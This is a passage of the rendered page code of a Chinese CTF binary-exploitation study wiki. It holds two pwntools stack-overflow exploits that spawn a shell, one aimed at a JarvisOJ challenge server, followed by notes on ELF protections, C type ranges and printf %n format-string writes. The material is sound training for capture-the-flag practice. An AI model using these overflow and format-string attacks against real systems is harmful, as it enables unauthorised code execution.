number"}},[t._v("0x80")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 随意填充0x80个，")]),t._v("\n\n\nfakebp "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("8")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 看char buf，双击进buf，最下面还有8个bytes")]),t._v("\nsyscall "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x0000000000400596")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# ida 查看 exports 填入地址")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" junk "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" fakebp "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" p64"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("syscall"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 正常是vulnerable_function()返回地址，我们这里覆盖为syscall地址，得到shell")]),t._v("\nsh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("send"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nsh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br")])]),n("h4",{attrs:{id:"读取-symbol-system的地址"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#读取-symbol-system的地址"}},[t._v("#")]),t._v(" 读取 symbol system的地址")]),t._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#!/usr/bin/env python")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# -*- coding: utf-8 -*-")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("from")]),t._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("import")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("\n\nio "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" remote"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"pwn2.jarvisoj.com"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("9878")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nelf "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" ELF"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"./level2"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n\nsys_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("symbols"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"system"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),t._v("                     "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# IDA对应的函数为 _system 0x08048320")]),t._v("\nbin_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("search"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"/bin/sh"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("encode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("__next__"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# IDA可见 0x804a024")]),t._v("\n\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'a'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x88")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0x4")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("                 "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#辣鸡填充值")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("sys_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'latin'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("   "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#覆盖返回地址到system函数")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0xdeadbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'latin'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#随意填写system函数调用结束的返回地址 0x1也行")]),t._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+=")]),t._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("bin_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("decode"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'latin'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("   "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#system函数的参数，指向“/bin/sh”，实现调用")]),t._v("\n\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("recvline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\nio"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("close"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br"),n("span",{staticClass:"line-number"},[t._v("11")]),n("br"),n("span",{staticClass:"line-number"},[t._v("12")]),n("br"),n("span",{staticClass:"line-number"},[t._v("13")]),n("br"),n("span",{staticClass:"line-number"},[t._v("14")]),n("br"),n("span",{staticClass:"line-number"},[t._v("15")]),n("br"),n("span",{staticClass:"line-number"},[t._v("16")]),n("br"),n("span",{staticClass:"line-number"},[t._v("17")]),n("br"),n("span",{staticClass:"line-number"},[t._v("18")]),n("br"),n("span",{staticClass:"line-number"},[t._v("19")]),n("br")])]),n("h2",{attrs:{id:"wiki"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#wiki"}},[t._v("#")]),t._v(" Wiki")]),t._v(" "),n("h3",{attrs:{id:"checksec-、-二进制保护机制"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#checksec-、-二进制保护机制"}},[t._v("#")]),t._v(" checksec 、 二进制保护机制")]),t._v(" "),n("p",[n("strong",[t._v("0x00 checksec")])]),t._v(" "),n("p",[t._v("打开了RELRO、Canary和NX，那就没办法做栈溢出了。")]),t._v(" "),n("p",[t._v("这里主要讲的是CTF中linux下的ELF二进制文件的保护机制。在linux中有一个脚本checksec命令可以查看当前二进制文件的保护机制。任意安装一款gdb插件都会把checksec脚本包含进来。")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("在gdb中执行：\ngdb> checksec test\nCanary                      : No\nNX                            : Yes\nPIE                           : No\nFortify                       : No\nRelRO                        : Partial\n\n直接在shell中执行：\n$ checksec test\nArch:     i386-32-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX enabled\nPIE:      No PIE (0x8048000)\n可以看到checksec可以查看当前二进制文件的指令架构以及采取了哪些保护机制。\n")])])]),n("p",[t._v("示例2")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("确定保护 \n\njarvisOJ_typo [master●●] check ./typo\ntypo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n[*] '/home/m4x/pwn_repo/jarvisOJ_typo/typo'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x8000)\n静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 system 等危险函数和 \"/bin/sh\" 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell\n")])])]),n("hr"),t._v(" "),n("p",[n("strong",[t._v("0x01 二进制保护机制")])]),t._v(" "),n("p",[n("strong",[t._v("1.Canary（栈保护）")])]),t._v(" "),n("p",[t._v("这个选项表示栈保护功能有没有开启。")]),t._v(" "),n("p",[t._v("栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。")]),t._v(" "),n("p",[n("strong",[t._v("2.NX/DEP（堆栈不可执行）")])]),t._v(" "),n("p",[t._v("NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。")]),t._v(" "),n("p",[n("img",{attrs:{src:a(607),alt:"Alt text"}})]),t._v(" "),n("p",[n("strong",[t._v("3.PIE/ASLR（地址随机化）")])]),t._v(" "),n("p",[t._v("开启后地址变量地址不固定")]),t._v(" "),n("p",[t._v("__4.Fortify __")]),t._v(" "),n("p",[t._v("这个保护机制查了很久都没有个很好的汉语形容，根据我的理解它其实和栈保护都是gcc的新的为了增强保护的一种机制，防止缓冲区溢出攻击。由于并不是太常见，也没有太多的了解。")]),t._v(" "),n("p",[n("strong",[t._v("5.RelRO")])]),t._v(" "),n("p",[t._v("设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT（Global Offset Table）攻击。")]),t._v(" "),n("p",[t._v("0x02 "),n("a",{attrs:{href:"http://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/",target:"_blank",rel:"noopener noreferrer"}},[t._v("参考"),n("OutboundLink")],1)]),t._v(" "),n("h3",{attrs:{id:"栈"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#栈"}},[t._v("#")]),t._v(" 栈")]),t._v(" "),n("p",[t._v("参数入栈方式是从右向左。")]),t._v(" "),n("p",[n("img",{attrs:{src:a(608),alt:"Alt text"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(609),alt:"Alt text"}})]),t._v(" "),n("h3",{attrs:{id:"c代码翻译"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#c代码翻译"}},[t._v("#")]),t._v(" C代码翻译")]),t._v(" "),n("p",[n("code",[t._v("_readfsqword(0x28u)")]),t._v(" 通常用于alarm函数，防止调试")]),t._v(" "),n("p",[n("code",[t._v("strcmp(str1,str2)")]),t._v(" ，若str1=str2，则返回零；若str1<str2，则返回负数；若str1>str2，则返回正数")]),t._v(" "),n("h3",{attrs:{id:"c语言各数据类型大小和取值范围"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#c语言各数据类型大小和取值范围"}},[t._v("#")]),t._v(" C语言各数据类型大小和取值范围")]),t._v(" "),n("p",[n("a",{attrs:{href:"http://shell-storm.org/shellcode/files/syscalls.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Linux System Call Table"),n("OutboundLink")],1)]),t._v(" "),n("p",[n("a",{attrs:{href:"https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/",target:"_blank",rel:"noopener noreferrer"}},[t._v("LINUX SYSTEM CALL TABLE FOR X86 64"),n("OutboundLink")],1)]),t._v(" "),n("p",[t._v("有符号整数类型")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("类型名称")]),t._v(" "),n("th",[t._v("字节数")]),t._v(" "),n("th",[t._v("取值范围")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("signed char")]),t._v(" "),n("td",[t._v("1")]),t._v(" "),n("td",[t._v("-2^7(-128) ~ 2^7-1(127)")])]),t._v(" "),n("tr",[n("td",[t._v("short int 或 short")]),t._v(" "),n("td",[t._v("2")]),t._v(" "),n("td",[t._v("-2^15(-32 768) ~ 2^15-1(32 767)")])]),t._v(" "),n("tr",[n("td",[t._v("int")]),t._v(" "),n("td",[t._v("4")]),t._v(" "),n("td",[t._v("-2^31(-2 147 483 648) ~ 2^31-1(2 147 483 647)")])]),t._v(" "),n("tr",[n("td",[t._v("long int 或 long")]),t._v(" "),n("td",[t._v("4")]),t._v(" "),n("td",[t._v("-2^31(-2 147 483 648) ~ 2^31-1(2 147 483 647)")])]),t._v(" "),n("tr",[n("td",[t._v("long long int 或 long long")]),t._v(" "),n("td",[t._v("8")]),t._v(" "),n("td",[t._v("-2^63(-9.2233720368548e+18) ~ 2^63-1(9.2233720368548e+18)")])])])]),t._v(" "),n("p",[t._v("无符号整数类型")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("类型名称")]),t._v(" "),n("th",[t._v("字节数")]),t._v(" "),n("th",[t._v("取值范围")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("unsigned char")]),t._v(" "),n("td",[t._v("1")]),t._v(" "),n("td",[t._v("0 ~ 2^8-1(255)")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned short int 或 unsigned short")]),t._v(" "),n("td",[t._v("2")]),t._v(" "),n("td",[t._v("0 ~ 2^16-1(65 535)")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned int")]),t._v(" "),n("td",[t._v("4")]),t._v(" "),n("td",[t._v("0 ~ 2^32-1(4 294 967 295)")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned long int 或 unsigned long")]),t._v(" "),n("td",[t._v("4")]),t._v(" "),n("td",[t._v("0 ~ 2^32-1(4 294 967 295)")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned long long int 或 unsigned long long")]),t._v(" "),n("td",[t._v("8")]),t._v(" "),n("td",[t._v("0 ~ 2^64-1(1.844674407371e+19)")])])])]),t._v(" "),n("p",[t._v("浮点类型")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("类型名称")]),t._v(" "),n("th",[t._v("字节数")]),t._v(" "),n("th",[t._v("取值范围")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("float")]),t._v(" "),n("td",[t._v("4")]),t._v(" "),n("td",[t._v("-/+3.4e38（精确到6位小数）")])]),t._v(" "),n("tr",[n("td",[t._v("double")]),t._v(" "),n("td",[t._v("8")]),t._v(" "),n("td",[t._v("-/+1.7e308（精确到15位小数）")])]),t._v(" "),n("tr",[n("td",[t._v("long double")]),t._v(" "),n("td",[t._v("12")]),t._v(" "),n("td",[t._v("-/+1.19e4932（精确到18位小数）")])])])]),t._v(" "),n("p",[t._v("极限值符号")]),t._v(" "),n("p",[t._v("表示有符号整数类型的极限值符号")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("类型名称")]),t._v(" "),n("th",[t._v("下限")]),t._v(" "),n("th",[t._v("上限")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("char")]),t._v(" "),n("td",[t._v("CHAR_MIN")]),t._v(" "),n("td",[t._v("CHAR_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("short")]),t._v(" "),n("td",[t._v("SHRT_MIN")]),t._v(" "),n("td",[t._v("SHRT_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("int")]),t._v(" "),n("td",[t._v("INT_MIN")]),t._v(" "),n("td",[t._v("INT_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("long")]),t._v(" "),n("td",[t._v("LONG_MIN")]),t._v(" "),n("td",[t._v("LONG_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("long long")]),t._v(" "),n("td",[t._v("LLONG_MIN")]),t._v(" "),n("td",[t._v("LLONG_MAX")])])])]),t._v(" "),n("p",[t._v("表示无符号整数类型的极限值符号")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("类型名称")]),t._v(" "),n("th",[t._v("下限")]),t._v(" "),n("th",[t._v("上限")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("unsigned char")]),t._v(" "),n("td",[t._v("0")]),t._v(" "),n("td",[t._v("UCHAR_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned short")]),t._v(" "),n("td",[t._v("0")]),t._v(" "),n("td",[t._v("USHRT_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned int")]),t._v(" "),n("td",[t._v("0")]),t._v(" "),n("td",[t._v("UINT_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned long")]),t._v(" "),n("td",[t._v("0")]),t._v(" "),n("td",[t._v("ULONG_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("unsigned long long")]),t._v(" "),n("td",[t._v("0")]),t._v(" "),n("td",[t._v("ULLONG_MAX")])])])]),t._v(" "),n("p",[t._v("表示浮点类型的极限值符号")]),t._v(" "),n("table",[n("thead",[n("tr",[n("th",[t._v("类型名称")]),t._v(" "),n("th",[t._v("下限")]),t._v(" "),n("th",[t._v("上限")])])]),t._v(" "),n("tbody",[n("tr",[n("td",[t._v("float")]),t._v(" "),n("td",[t._v("FLT_MIN")]),t._v(" "),n("td",[t._v("FLT_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("double")]),t._v(" "),n("td",[t._v("DBL_MIN")]),t._v(" "),n("td",[t._v("DBL_MAX")])]),t._v(" "),n("tr",[n("td",[t._v("long double")]),t._v(" "),n("td",[t._v("LDBL_MIN")]),t._v(" "),n("td",[t._v("LDBL_MAX")])])])]),t._v(" "),n("h3",{attrs:{id:"printf"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#printf"}},[t._v("#")]),t._v(" printf")]),t._v(" "),n("div",{staticClass:"language- extra-class"},[n("pre",[n("code",[t._v("%d - 十进制 - 输出十进制整数\n%s - 字符串 - 从内存中读取字符串\n%x - 十六进制 - 输出十六进制数\n%c - 字符 - 输出字符\n%p - 指针 - 指针地址\n%n - 到目前为止所写的字符数,%n这个格式化字符串，它的功能是将%n之前打印出来的字符个数，赋值给一个变量，例如这样：\n     可以理解成 %n 是对变量赋值, 值为长度数\n     %?$n 向栈内第?个指向的 地址处写入字符串长度。\n     比如栈内第2个值为0x40056a, %85c%2$n，就是向地址0x40056a写入85\n")])])]),n("p",[n("a",{attrs:{href:"https://blog.csdn.net/qinying001/article/details/98527949",target:"_blank",rel:"noopener noreferrer"}},[t._v("Link"),n("OutboundLink")],1),t._v(" 可以理解成 %n 是对变量赋值, 值为长度数")]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[n("span",{pre:!0,attrs:{class:"token macro property"}},[t._v("#"),n("span",{pre:!0,attrs:{class:"token directive keyword"}},[t._v("include")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("<stdio.h>")])]),t._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" argc"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("char")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("const")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" a "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"Hello world%n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("&")]),t._v("a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token function"}},[t._v("printf")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v('"%d\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" a"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("return")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// Hello world11, a的值被改变了, gcc编译下。")]),t._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br"),n("span",{staticClass:"line-number"},[t._v("7")]),n("br"),n("span",{staticClass:"line-number"},[t._v("8")]),n("br"),n("span",{staticClass:"line-number"},[t._v("9")]),n("br"),n("span",{staticClass:"line-number"},[t._v("10")]),n("br")])]),n("p",[t._v("任意内存读取")]),t._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('#include <stdio.h>\nint (){\n        char str[100];\n        scanf("%s",str);\n        printf(str);\n}\n')])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br"),n("span",{staticClass:"line-number"},[t._v("3")]),n("br"),n("span",{staticClass:"line-number"},[t._v("4")]),n("br"),n("span",{staticClass:"line-number"},[t._v("5")]),n("br"),n("span",{staticClass:"line-number"},[t._v("6")]),n("br")])]),n("p",[t._v("任意内存写入")]),t._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[t._v('printf("addr%m$n",&arg);\n在addr地址的第m个参数写入4个字节(addr)的数据，arg=4\n')])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br"),n("span",{staticClass:"line-number"},[t._v("2")]),n("br")])]),n("p",[t._v("%85c%7$n ，作用是将85写入栈内第7个参数所指向的地址。")]),t._v(" "),n("p",[t._v("在 printf 中，使用 "),n("code",[t._v("*<a_number_of_chars>%<number>$n*")]),t._v(" 就可以将相应的第 "),n("code",[t._v("*<number>*")]),t._v(" 个参数的位置写为 % 前输出的字符数量")]),t._v(" "),n("p",[t._v("如本题先用 %85c 输出了85个字符，再用 %7$n 将第七个参数的位置写成了85")]),t._v(" "),n("h4",{attrs:{id:"的作用"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#的作用"}},[t._v("#")]),t._v(" $的作用")]),t._v(" "),n("p",[t._v("Linux下, x$指栈第x个参数的地址, 下面2$指第2个地址, $1指第一个地址. 即输出2, 3")]),t._v(" "),n("div",{staticClass:"language-c line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-c"}},[n("code",[t._v("    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("int")]),t._v(" a "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("3")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" b 